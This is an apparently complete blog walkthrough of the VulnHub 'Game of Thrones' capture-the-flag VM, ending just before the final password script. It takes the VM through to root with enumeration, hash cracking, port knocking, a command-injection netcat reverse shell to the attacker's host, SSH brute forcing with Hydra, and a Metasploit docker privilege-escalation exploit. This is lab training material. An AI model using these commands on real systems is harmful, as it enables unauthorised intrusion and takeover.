<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
            <h1 class="post-title entry-title">Hack the Game of Thrones VM (CTF Challenge)</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-game-thrones-vm-ctf-challenge/" rel="bookmark"><time class="entry-date published" datetime="2018-02-15T10:34:37+00:00">February 15, 2018</time><time class="updated" datetime="2025-06-10T20:29:53+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Hello friends! Today we are going to take another CTF challenge known as Game of Thrones. The credit for making this vm machine goes to “OscarAkaElvis” and it is another capture the flag challenge in which our goal is to get all the flags to complete the challenge. You can download this VM <a style="color: #000000;" href="https://www.vulnhub.com/entry/game-of-thrones-ctf-1,201/#download"><strong>here</strong></a>.</span></p>
<p><span style="color: #000000;">Let’s Breach!!!</span></p>
<p><span style="color: #000000;">Let us start form getting to know the IP of VM (Here, I have it at 192.168.1.133 but you will have to find your own)</span></p>
<pre class="lang:default decode:true">netdiscover</pre>
<p><img decoding="async" src="https://3.bp.blogspot.com/-OWAsdwbcwL0/WoV5CQ1xw0I/AAAAAAAAUtE/Nmj-jhJI3LwSPMIFF82Z2pHdHMLU8X-WACLcBGAs/s1600/1.png"/></p>
<p><span style="color: #000000;">Use nmap for port enumeration</span></p>
<pre class="lang:default decode:true">nmap -p- -sV 192.168.1.133</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-qTitp7O2f0Q/WoVFVjb4eQI/AAAAAAAAUU0/IW4c7W-FX0s4vc20Xeo67IHpIiYfji7dgCLcBGAs/s1600/2.png" border="0" data-original-height="285" data-original-width="639"/></span></p>
<p><span style="color: #000000;">We find that port 80 is running http, so we open the ip in our browser.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-XG2MTIDGmQs/WoVFaPKOQqI/AAAAAAAAUVs/xwRnIkAfZDY6hjCfZVrk6mUk1LZ-LJYVgCLcBGAs/s1600/3.png" border="0" data-original-height="455" data-original-width="651"/></span></p>
<p><span style="color: #000000;">We take a look at the source code and find the flag syntax.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-x8ld5NvwRW8/WoVFespDKMI/AAAAAAAAUWg/LXypCRcOXuI-8cLY7BY-kAHfGFLIXBteACLcBGAs/s1600/4.1.png" border="0" data-original-height="433" data-original-width="632"/></span></p>
<p><span style="color: #000000;">Use dirb to enumerate the ports.</span></p>
<pre class="lang:default decode:true">dirb http://192.168.1.133</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-66tRzOheClI/WoVFeiLjiSI/AAAAAAAAUWk/x1kzutbIlZgCfTnf0LJv_SmUiaO3mZuawCLcBGAs/s1600/4.png" border="0" data-original-height="411" data-original-width="487"/></span></p>
<p><span style="color: #000000;">We find the robots.txt file, we open it and find few directories.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-FNZlBDf-6Mo/WoVFiKevJKI/AAAAAAAAUXU/OMRW71vFxbASgzRb97NYE1_cXZYsBdLsQCLcBGAs/s1600/5.png" border="0" data-original-height="156" data-original-width="387"/></span></p>
<p><span style="color: #000000;">We open the directory /<em>secret-island</em>/ using user-agent Three-eyed-raven</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-fzNAeZwVNRA/WoVFlq0_JCI/AAAAAAAAUYA/M46UbT1OM58240Y4QMIwgcV_cUQjBYF3wCLcBGAs/s1600/6.png" border="0" data-original-height="124" data-original-width="528"/></span></p>
<p><span style="color: #000000;">We open it and find a link to a map.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-xcDIOga6ZTM/WoVFmc5axaI/AAAAAAAAUYM/8Axz3XnxpgA2BaVLxxVRzTW7O5pkilICQCLcBGAs/s1600/7.png" border="0" data-original-height="366" data-original-width="630"/></span></p>
<p><span style="color: #000000;">When we open the map we find the location of all the flags.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-bUJV34SUxUg/WoVFm6iuVpI/AAAAAAAAUYU/u7WyAS3HvnU-7kff_Cogojr3xaPN8ICLACLcBGAs/s1600/8.png" border="0" data-original-height="459" data-original-width="643"/></span></p>
<p><span style="color: #000000;">We open the directory called /<em>direct-access-to-kings-landing</em>/ using user-agent Three-eyed-raven.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-zkwSq47Q2RU/WoVFm99ds3I/AAAAAAAAUYQ/ppbu-FZrlsgM1b3S7f_kpGfi6SZNI4OmgCLcBGAs/s1600/9.png" border="0" data-original-height="132" data-original-width="516"/></span></p>
<p><span style="color: #000000;">We open the directory and take a look at the source code and find what looks like port for port knocking and to user as oberynmartell.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-dxbt8RvauEA/WoVFStlhzFI/AAAAAAAAUUM/wec2EMsYpdg4wsAR7jxWy2mr1HvYAvSUACLcBGAs/s1600/10.png" border="0" data-original-height="439" data-original-width="655"/></span></p>
<p><span style="color: #000000;">We then find /<em>h/i/d/d/e/n/ </em>directory using dirb and we open it.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-XBAjv8jB1dU/WoVFS46CW4I/AAAAAAAAUUQ/61dIrYbRfOQF7tRDb49kr6U0PeclCAhrgCLcBGAs/s1600/11.png" border="0" data-original-height="454" data-original-width="639"/></span></p>
<p><span style="color: #000000;">We take a look at the source code and find password for oberynmartell.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-hCvmzTqmvwE/WoVFTuthMkI/AAAAAAAAUUU/jkh4rAKv72sq2IIRUWKQ5jyKaBioSPSHQCLcBGAs/s1600/12.png" border="0" data-original-height="434" data-original-width="646"/></span></p>
<p><span style="color: #000000;">We use ftp to connect we use the username and password we previously found to login. We get the first flag as soon we login.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-Gp5b_GfEMDY/WoVFThaV6MI/AAAAAAAAUUY/81jsfTf_Bvwc-Zui0FmPAYJUkHiSCYc0wCLcBGAs/s1600/13.png" border="0" data-original-height="406" data-original-width="635"/></span></p>
<p><span style="color: #000000;">We find two files and download through ftp and find a file that gives us the type of hash it uses.</span></p>
<p><span style="color: #000000;">We save the hash in a file.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/--9ySRhsOFWQ/WoVFTyXdTFI/AAAAAAAAUUc/sABZ5QGRl4susoMkRbKQ-n-shx4ZdP-JwCLcBGAs/s1600/14.png" border="0" data-original-height="205" data-original-width="645"/></span></p>
<p><span style="color: #000000;">Now we use john the ripper to decrypt the file and find the password to be stark</span></p>
<pre class="lang:default decode:true">john --format=dynamic_2008 hash.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-IB6QLzLsO6Q/WoVFUhhTi7I/AAAAAAAAUUg/qfywHc5FFQ8ubnpmXKs-ZqjBsN5_cPr3gCLcBGAs/s1600/15.png" border="0" data-original-height="170" data-original-width="641"/></span></p>
<p><span style="color: #000000;">Now we use mcrypt to decrypt the encrypted file we found in the ftp server.</span></p>
<pre class="lang:default decode:true">mcrypt -d the_wall.txt.nc</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-DXwxxo44qro/WoVFUidvS9I/AAAAAAAAUUk/AQF8FUD9-PIAeiWHmrlUzmc3PdOlgfZYQCLcBGAs/s1600/16.png" border="0" data-original-height="256" data-original-width="638"/></span></p>
<p><span style="color: #000000;">We now add the domain winterfell.7kingdoms.ctf to /etc/hosts and open the link found in the file.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-ew7vNq1Ahnk/WoVFUqu2f1I/AAAAAAAAUUo/L72LoQXxKgcXV0jBgYQNOBaB3bE3O0rFwCLcBGAs/s1600/17.png" border="0" data-original-height="464" data-original-width="662"/></span></p>
<p><span style="color: #000000;">We login using the username and password to login, and find a page with two images.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-26oyZWWoSGQ/WoVFVYLSfNI/AAAAAAAAUUw/nx9zlWaU5mk9WozMBN_UGGCFBownl2b4ACLcBGAs/s1600/18.png" border="0" data-original-height="453" data-original-width="631"/></span></p>
<p><span style="color: #000000;">We take a look at the source code, and we find the second flag.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-65Xv_7WsE2I/WoVFVdPz5CI/AAAAAAAAUUs/VNFPeadfr7YovUrf3llNoHm1L-XdmQEdgCLcBGAs/s1600/19.png" border="0" data-original-height="429" data-original-width="631"/></span></p>
<p><span style="color: #000000;">Along with the second flag we also find a hint that it contains something, so we download the file and use strings to take a look inside the file and find a domain name.</span></p>
<pre class="lang:default decode:true">strings stark_shield.jpg</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-GGIoNE1xBmo/WoVNdtErWoI/AAAAAAAAUZ0/4XA-BFpvhgANplkPaQu3P-EzVdRTnN18ACEwYBhgL/s1600/20%2B%25281%2529.png" border="0" data-original-height="52" data-original-width="645"/></span></p>
<p><span style="color: #000000;">It hints us that TXT record will contain something useful so we use nslookup to check the TXT records.  We had to make some changes to the domain name to make it valid, and we find our 3<sup>rd</sup> flag.</span></p>
<pre class="lang:default decode:true">nslookup -q=txt Timef0rconqu3rs.7Kingdoms.ctf 192.168.1.133</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-SZocbpc1JQE/WoVNd5r7tpI/AAAAAAAAUZ8/_RRJNbvW27kra0vkKGiBU5sm8ccgVycbACEwYBhgL/s1600/21.png" border="0" data-original-height="169" data-original-width="642"/></span></p>
<p><span style="color: #000000;">Now we add the new domain name to /etc/hosts and open the link found in TXT record above.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-k8vIYLBEk4c/WoVNeWgkihI/AAAAAAAAUaA/A8Es4DuVnQosVcPCg2nlzfPiUYiKEN8rACEwYBhgL/s1600/22.png" border="0" data-original-height="451" data-original-width="647"/></span></p>
<p><span style="color: #000000;">We use login the username and password we find in the TXT records.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-0DOSTmNBrF0/WoVRoqIV9fI/AAAAAAAAUjM/Jgktab79O4cXp0wqwEqJ2_yx90kAQn_jACEwYBhgL/s1600/23.png" border="0" data-original-height="437" data-original-width="633"/></span></p>
<p><span style="color: #000000;">We use the search provided by the site to check for vulnerabilities.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-QHbbef6JGXI/WoVRo24L_aI/AAAAAAAAUjQ/ucPvu5bUUmA-Y_vU24uEdfxWEATrbOAhACEwYBhgL/s1600/24.jpg" border="0" data-original-height="692" data-original-width="907"/></span></p>
<p><span style="color: #000000;">We use the file manager module and it opened a file manager that lets us access few files.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-h-4lijWx29I/WoVRpM11dWI/AAAAAAAAUjU/DS12UJRR0S8Q5uzd8KUpkR8gZq3xwq0bQCEwYBhgL/s1600/25.png" border="0" data-original-height="443" data-original-width="640"/></span></p>
<p><span style="color: #000000;">In /home/aryastark folder we find a file called flag.txt</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-WjYTThRuxvE/WoVRpeiJi3I/AAAAAAAAUjY/M7CWUBPmt_wR8qxs6ulf_MO9ajJHG-y_gCEwYBhgL/s1600/26.1.jpg" border="0" data-original-height="261" data-original-width="925"/></span></p>
<p><span style="color: #000000;">We download the file and open it in our system and find our 4<sup>th</sup> flag.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-irlIA1lQS2o/WoVRponCnqI/AAAAAAAAUjg/kp-AEYpk1-QhRyAm_PRdzrFtKhgOGREFACEwYBhgL/s1600/26.2.png" border="0" data-original-height="325" data-original-width="795"/></span></p>
<p><span style="color: #000000;">Now we got a hint to access a database now we know the server is running postgresql, we connect to it using the username password available in the file we find earlier.</span></p>
<pre class="lang:default decode:true">psql –h 192.168.1.133 –u robinarryn –d mountainandthevale</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-ZW3cAus9e8k/WoVRp1LDZ4I/AAAAAAAAUjk/MRUWzB04Kl4HFs5vEbnRoyLZoSZp_HlZgCEwYBhgL/s1600/26.png" border="0" data-original-height="311" data-original-width="601"/></span></p>
<p><span style="color: #000000;">We find a table called flag, we open it and find a base64 encoded string.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-SYiPXl5d9Kk/WoVRqHCOaMI/AAAAAAAAUjo/BtLxxwxdU3UJ6ZIm4LnEtjn9Gi1SEAgUgCEwYBhgL/s1600/27.png" border="0" data-original-height="238" data-original-width="642"/></span></p>
<p><span style="color: #000000;">We decode the base64 encode string and find our 5<sup>th</sup> flag.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-xPYmK28WQp4/WoVRrK5fk1I/AAAAAAAAUjs/ZhTn1U7WZusl0qdgmckWLsXAkRf-xkn4QCEwYBhgL/s1600/28.png" border="0" data-original-height="173" data-original-width="646"/></span></p>
<p><span style="color: #000000;">Now we check the other tables to check if we miss anything. In one of the tables we find a few names</span></p>
<pre class="lang:default decode:true">select * from arya_kill_list</pre>
<p><span style="color: #000000;">In arya_kill_list we find these names that seems useful.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-HqI0XnIiSls/WoVR2D1rTrI/AAAAAAAAUl4/ZC36i-2qrMUmBTpNGwVClTwGmvwNEpguQCEwYBhgL/s1600/56.png" border="0" data-original-height="359" data-original-width="642"/></span></p>
<p><span style="color: #000000;">Searching through the database we find a rot16 encoded string.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-DpnY9Tjtbfk/WoVR2egahrI/AAAAAAAAUl8/adFqMhJe9tU_abIDNkxUIFTIqdv8RYSYwCEwYBhgL/s1600/57.png" border="0" data-original-height="374" data-original-width="641"/></span></p>
<p><span style="color: #000000;">We now convert the rot16 encoded flag and find a name of database along with the password. It also gives us a hint to use the username we find in the table above.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-l24uUY94NS4/WoVR2hN25dI/AAAAAAAAUmA/vRbXgWGKIbsoNK2wZ6FEsQP-HScGSs50QCEwYBhgL/s1600/58.png" border="0" data-original-height="233" data-original-width="442"/></span></p>
<p><span style="color: #000000;">After enumerating the username we find that TheRedWomanMelisandre is the username.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-4__rUp1zDgg/WoVR25aozLI/AAAAAAAAUmE/DSYTszQeSI0eJsZtNH3q7UaVmVpKIWZaQCEwYBhgL/s1600/59.png" border="0" data-original-height="223" data-original-width="642"/></span></p>
<p><span style="color: #000000;">Now we check the the table and find a secret flag.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-c1KwFcEPHJI/WoVR3gJNJoI/AAAAAAAAUmM/6a3ZL7WJ_ugRI9MsU94Ovnw_9Attp6ucwCEwYBhgL/s1600/60.png" border="0" data-original-height="72" data-original-width="642"/></span></p>
<p><span style="color: #000000;">Now we know kingdom of reach is in imap as it was shown in the map, now we use the number we find earlier to port knock.</span></p>
<pre class="lang:default decode:true">knock 192.168.1.133 3487 64535 12345</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-pqga6JbreGw/WoVRrlG8qyI/AAAAAAAAUjw/8Ysvc3-MPWshi-NiKwRCTyb9LgBDN4pigCEwYBhgL/s1600/29.png" border="0" data-original-height="35" data-original-width="424"/></span></p>
<p><span style="color: #000000;">Now we do a nmap scan to check if any new port opened on the server, we find that port 143 that is running imap opened.</span></p>
<pre class="lang:default decode:true">nmap -p- 192.168.1.133</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-YU07wJnoKJw/WoVRryBWRuI/AAAAAAAAUj4/23-F3-gffTwW5zoQgnFDg2uCtyWyIxQ_wCEwYBhgL/s1600/30.png" border="0" data-original-height="337" data-original-width="512"/></span></p>
<p><span style="color: #000000;">We use netcat to connect to it, we use the username and password we find in the hint earlier.</span></p>
<pre class="lang:default decode:true">nc 192.168.1.133 143</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/--CO80XGcjT0/WoVRsoGxpMI/AAAAAAAAUj8/c8mzP3YTLLohpjm1Dy9RcbErs1YoEu-8ACEwYBhgL/s1600/31.1.png" border="0" data-original-height="238" data-original-width="641"/></span></p>
<p><span style="color: #000000;">In the inbox we find our 6<sup>th</sup> flag, we also get a hint to use port 1337 and a username and password is given to login.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-DiWNC7uvr8o/WoVRshLSI8I/AAAAAAAAUkA/qLdl3yoVEaUEnzQDpmrAsda8zfjpvYssACEwYBhgL/s1600/31.2.png" border="0" data-original-height="337" data-original-width="641"/></span></p>
<p><span style="color: #000000;">We login into the site and find that it is git site.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-HkpngseR0Tg/WoVRs91v35I/AAAAAAAAUkE/gGogF_WyW3YsTqI_Ps5XILFZ5c0oxMpCgCEwYBhgL/s1600/31.png" border="0" data-original-height="384" data-original-width="731"/></span></p>
<p><span style="color: #000000;">After enumerating through the files we find that this site is vulnerable to command injection and a hint to use mysql.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-pjtNp90R-n4/WoVRtT4s2II/AAAAAAAAUkI/0JTf-pzh3ewJl3iBZt1nZPKMwru_mrXsQCEwYBhgL/s1600/32.png" border="0" data-original-height="455" data-original-width="633"/></span></p>
<p><span style="color: #000000;">We use netcat to get reverse shell on the site we use “”`code` to execute our code.</span></p>
<pre class="lang:default decode:true">nc -e /bin/bash 192.168.1.116 1234</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-AXENIK4rarM/WoVRtotYokI/AAAAAAAAUkM/Orhy-4Hsj9w9dp1ldCI-6PW6gkqXsdDvwCEwYBhgL/s1600/33.png" border="0" data-original-height="451" data-original-width="634"/></span></p>
<p><span style="color: #000000;">Now we setup our listener using netcat as soon as we execute our command we get a reverse shell.</span></p>
<pre class="lang:default decode:true">nc -lvp 1234</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-kJpS9n2HyHw/WoVRtnH2BYI/AAAAAAAAUkQ/dhNDHr4q6UcpnwSDjjtr8ZdwmD6zZs-3gCEwYBhgL/s1600/34.png" border="0" data-original-height="108" data-original-width="635"/></span></p>
<p><span style="color: #000000;">On the webpage earlier we find hex encoded string when we decode it we get a location of a file:/home/tyrionlannister/checkpoint.txt, so we open it and find username, password and name of the database we need to look for.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-3ybF-SNfug0/WoVRuFNS07I/AAAAAAAAUkU/wRW9bdD_orc6MgEyzNw19X7A3O6o3IR-wCEwYBhgL/s1600/35.png" border="0" data-original-height="290" data-original-width="640"/></span></p>
<p><span style="color: #000000;">Now we use the information above to find the tables available in the database.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-xfvxzrkd_XI/WoVaMzNqhVI/AAAAAAAAUqo/EQRTi5_uGAkc31ufgE4ZctIkZ0rTHVVAQCEwYBhgL/s1600/36.png" border="0" data-original-height="149" data-original-width="644"/></span></p>
<p><span style="color: #000000;">We find the name of the table, it is called iron_throne, we take a look inside the table.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-DL3ZBLgFZ9s/WoVaMlUy5kI/AAAAAAAAUqk/CaI-aZ3PcJw99fdWI_UGvCBttw5H5-Y6wCEwYBhgL/s1600/37.png" border="0" data-original-height="252" data-original-width="640"/></span></p>
<p><span style="color: #000000;">Now we find a morse code when we decode it we find it converts to /etc/mysql/flag, when we try to access it gives that file not found, earlier we find a hint that states we don’t have enough privileges so we try to take a look at our privileges.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-JnjXfcj5_pw/WoVaM1aKVdI/AAAAAAAAUqs/OsUDpLEHhucwBqIKLusoHKkW_kVa8UbYACEwYBhgL/s1600/38.png" border="0" data-original-height="273" data-original-width="639"/></span></p>
<p><span style="color: #000000;">We find that we can import files into the database. So first we create a table named Flag.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-bhNvW5I0u-A/WoVaNWuL2XI/AAAAAAAAUqw/ecHLdlcR0Kk_1hxtxoyl0khkQjpjn9LnACEwYBhgL/s1600/39.png" border="0" data-original-height="79" data-original-width="640"/></span></p>
<p><span style="color: #000000;">Now we import the file into our table.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-lPvgrp9Odmc/WoVaNjkW8wI/AAAAAAAAUq4/pf9fxrAEEvMpMle5vw5XjcueaCVnHKuJQCEwYBhgL/s1600/40.png" border="0" data-original-height="84" data-original-width="636"/></span></p>
<p><span style="color: #000000;">Now when we access it we find our 7<sup>th</sup> flag. We also get username and password for ssh login.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-kryKPrC640I/WoVaNrU5ACI/AAAAAAAAUq0/Z4T4QZeMrnY5iAX8cXYL5OTQaaiaJ_eggCEwYBhgL/s1600/41.png" border="0" data-original-height="376" data-original-width="640"/></span></p>
<p><span style="color: #000000;">Now we use this to login through ssh.</span></p>
<pre class="lang:default decode:true">ssh daenerystargaryen@192.168.1.133</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-VN6sdxLMGes/WoVaN1Hqv6I/AAAAAAAAUq8/a-nIispIlgoGIFbF-51BdwhJlp-2nt1RQCEwYBhgL/s1600/42.png" border="0" data-original-height="374" data-original-width="641"/></span></p>
<p><span style="color: #000000;">Enumerating through the system we find two files called digger.txt and checkpoint.txt, checkpoint.txt contains a hint to login through ssh at ip 172.25.0.2 and use the file digger.txt to login through ssh.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-nc3oYTyGl2E/WoVaOdTO4-I/AAAAAAAAUrE/4iaZG2Ui9-Q7zbSgwLwY75G8nAAXsOzqQCEwYBhgL/s1600/43.1.png" border="0" data-original-height="222" data-original-width="641"/></span></p>
<p><span style="color: #000000;">We download digger.txt to our system through ssh.</span></p>
<pre class="lang:default decode:true">scp digger.txt root@192.168.1.116:</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-SObwcDc_o8k/WoVaOGcOc7I/AAAAAAAAUsQ/IABgdIlFpw8p1K5cTbOIDg_rY_TahUBegCEwYBhgL/s1600/43.png" border="0" data-original-height="139" data-original-width="642"/></span></p>
<p><span style="color: #000000;">We use local tunnelling to bind it to our port 2222.</span></p>
<pre class="lang:default decode:true">ssh daenerystargaryen@192.168.1.133 –L 2222:172.25.0.2:22 –N</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-fZtht9wFqD8/WoVaOauX7YI/AAAAAAAAUrI/3u8va5t9apoOmd0Ftw6_WoVElTyAkVeUwCEwYBhgL/s1600/44.png" border="0" data-original-height="54" data-original-width="604"/></span></p>
<p><span style="color: #000000;">Now we use hydra to login through ssh to using username as root and use digger.txt file to brute force.</span></p>
<p><span style="color: #000000;">We find that for the username root we have password “Dr4g0nGl4ss!”</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-L7Ow-SOU4Vg/WoVaO6zuaWI/AAAAAAAAUsU/e7Zt50_LHDA2mBlJu6gp0lMxtE9orx-cQCEwYBhgL/s1600/45.png" border="0" data-original-height="307" data-original-width="640"/></span></p>
<p><span style="color: #000000;">We use this to login through ssh, we use localhost to connect as we have done ssh local tunnel to connect to trough ssh.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-lE3ywRsSxos/WoVaPZaKLbI/AAAAAAAAUsU/lUQvbIMJfQ0weIsCm5PRA8KYXVryeVdfQCEwYBhgL/s1600/46.png" border="0" data-original-height="340" data-original-width="645"/></span></p>
<p><span style="color: #000000;">Now we enumerating through the files we find our secret flag. We also get a username and password to login through ssh.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-SxAZfaYoSSI/WoVaPzCz6lI/AAAAAAAAUsU/egPtOhhaKds6ABJQF0ST0ai-80X50JhmACEwYBhgL/s1600/47.png" border="0" data-original-height="236" data-original-width="643"/></span></p>
<p><span style="color: #000000;">We use metasploit to connect through ssh using this username and password.</span></p>
<pre class="lang:default decode:true">msf &gt; use auxiliary/scanner/ssh/ssh_login
msf auxiliary(scanner/ssh/ssh_login) &gt; set rhosts 192.168.1.133
msf auxiliary(scanner/ssh/ssh_login) &gt; set username branstark
msf auxiliary(scanner/ssh/ssh_login) &gt; set  password Th3_Thr33_Ey3d_Raven
msf auxiliary(scanner/ssh/ssh_login) &gt; run</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-CeONUym6kiw/WoVaP1EGN3I/AAAAAAAAUrU/9Poo0jR-necmrVzLUm67pQrfBvG1sY4VwCEwYBhgL/s1600/48.png" border="0" data-original-height="290" data-original-width="643"/></span></p>
<p><span style="color: #000000;">After searching for some obvious possibilities to escalate privileges such as executables with the setuid bit set or exploits for the kernel, we noticed that this server is docker based. So we use the docker privilege escalation in metasploit.</span></p>
<pre class="lang:default decode:true">msf &gt; use exploit/linux/local/docker_daemon_privilege_escalation
msf exploit(linux/local/docker_daemon_privilege_escalation) &gt;  set lhost 192.168.1.116
msf exploit(linux/local/docker_daemon_privilege_escalation) &gt;  set payload linux/x86/meterpreter/reverse_tcp
msf exploit(linux/local/docker_daemon_privilege_escalation) &gt;  set session 1
msf exploit(linux/local/docker_daemon_privilege_escalation) &gt;  run</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-vMZWXnAbRZk/WoVaQe-LM7I/AAAAAAAAUsY/LgY2asDCCkEc5w0qoHhPMZuMe34NjxH9QCEwYBhgL/s1600/49.png" border="0" data-original-height="177" data-original-width="644"/></span></p>
<p><span style="color: #000000;">Now we get our escalated session, we now check and find that we are root.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-aJSvIfGObRQ/WoVaQ6n-VQI/AAAAAAAAUsg/BsL8VOnaUl46vdlYamimTGtbsHXjENfUQCEwYBhgL/s1600/50.png" border="0" data-original-height="104" data-original-width="319"/></span></p>
<p><span style="color: #000000;">Now we enumerate through the files and find password protected zip file called final_battle and a file that tells us how to find the password. It contains a pseudo code that tells us how to create the password using secret flags we found.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-bTerWo1r5cg/WoVaQmAGjZI/AAAAAAAAUsc/osJEzNfeyQglZrMVv5UmStV464If-iYXQCEwYBhgL/s1600/51.png" border="0" data-original-height="287" data-original-width="638"/></span></p>
<p><span style="color: #000000;">Now we have obtained 2 secret flag, searching through the files we find that music file contain a secret flag. In the home page we find 2 music file we use exiftool and find that the mp3 file contains the secret flag.</span></p>
<pre class="lang:default decode:true">exiftool  game_of_thrones.mp3</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-C2WIjiwT-60/WoVaTvQTMcI/AAAAAAAAUsM/oSKGgD7vspIF9H550ptILB4cnvznFIAwQCEwYBhgL/s1600/61.png" border="0" data-original-height="394" data-original-width="644"/></span></p>
<p><span style="color: #000000;">Now we create a code using the pseudocode as reference in python.</span></p>
